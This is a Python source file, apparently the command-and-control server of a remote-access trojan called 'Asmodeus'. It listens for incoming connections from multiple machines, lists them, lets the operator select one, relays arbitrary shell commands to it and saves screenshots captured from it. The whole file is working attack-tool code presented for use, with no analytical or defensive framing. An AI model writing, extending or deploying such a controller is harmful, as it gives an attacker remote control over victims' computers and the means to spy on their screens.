
import socket
import sys
import threading 
import time
from queue import Queue

# made by Helel
commands = ["quite","screenshot","exitserver"]
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]

queue = Queue()
all_connections = []
all_addr = []


def create_socket():
    try:
        global host 
        global port
        global s

        host = "127.0.0.1" #set your host ip here
        port = 7788  #set your host ip here
        s = socket.socket()

    except socket.error as msg:

        print("socket creating failed ! : ",str(msg))

# binds the server ip and port
def bind_socket():
    try:    
        global host 
        global port
        global s

        print("bining the port:"+str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:

        print("binging failed ! : ",str(msg))
        bind_socket()

#handeling connections 

def accept_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addr[:]

    while True:
        try:
            conn , addr = s.accept()
            s.setblocking(1) #prevents timeout

            all_connections.append(conn)
            all_addr.append(addr)

            print(f"[+] {addr[0]} Connection Has Been Established")

        except:
             print(f"[-] {addr[0]} Connection Failed")

#second thread

def start_shell():
    print("""\t
 █████  ███████ ███    ███  ██████  ██████  ███████ ██    ██ ███████ 
██   ██ ██      ████  ████ ██    ██ ██   ██ ██      ██    ██ ██      
███████ ███████ ██ ████ ██ ██    ██ ██   ██ █████   ██    ██ ███████ 
██   ██      ██ ██  ██  ██ ██    ██ ██   ██ ██      ██    ██      ██ 
██   ██ ███████ ██      ██  ██████  ██████  ███████  ██████  ███████ 
                                                                     
                                                                     
""")
    
    while True:
        cmd = input("Asmodeus ⦒ ")
        if cmd == "list":
            list_connections()   
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_command(conn)
        else:   
            print("[-] Command Doesnt Exists !")


def list_connections():
    results = ""
    for i,conn in enumerate(all_connections):
        try :
            conn.send(str.encode(" "))
            conn.recv(200000)
        except:
            del all_connections[i]
            del all_addr[i]
            continue
        results += "ⴲ " + str(i) + "       " + str(all_addr[i][0]) + "       " + str(all_addr[i][1]) + "\n"

    print("----------------CLIENTS----------------","\n",results)

def get_target(cmd):
    try: 
        target = cmd.replace('select ','')
        target = int(target)
        conn = all_connections[target]
        print(f"[+] Connection to {str(all_addr[target][0])} has been established")
        print(str(all_addr[target][0]) + " ⦒ " , end='')
        return conn
    except:
        print("[-] selection is not valid ")
        return None
    
def send_target_command(conn):
    while True:
        try:
            cmd = input('')
            if cmd == "quit":
                conn.close()
                break

            if len(cmd.strip()) > 0:
                conn.send(cmd.encode("utf-8"))
                # If we expect a screenshot, save the file instead of decoding
                if cmd == "screenshot":
                    # Choose where to save
                    filename = "received_screenshot.png"
                    
                    # Receive the image in chunks
                    with open(filename, "wb") as f:
                        conn.settimeout(2)  # wait max 2 sec for more data
                        try:
                            while True:
                                data = conn.recv(4096)
                                if not data:
                                    break
                                f.write(data)
                        except socket.timeout:
                            pass  # no more data
                        conn.settimeout(None)
                    
                    print(f"[+] Screenshot saved as {filename}")

                else:
                    # Normal text command
                    client_response = conn.recv(20480).decode("utf-8", errors="ignore")
                    print(client_response, end="")

        except Exception as e:
            print("[-] Error has occurred while sending commands:", str(e))
            break


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if x == 2:
            start_shell()
        
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()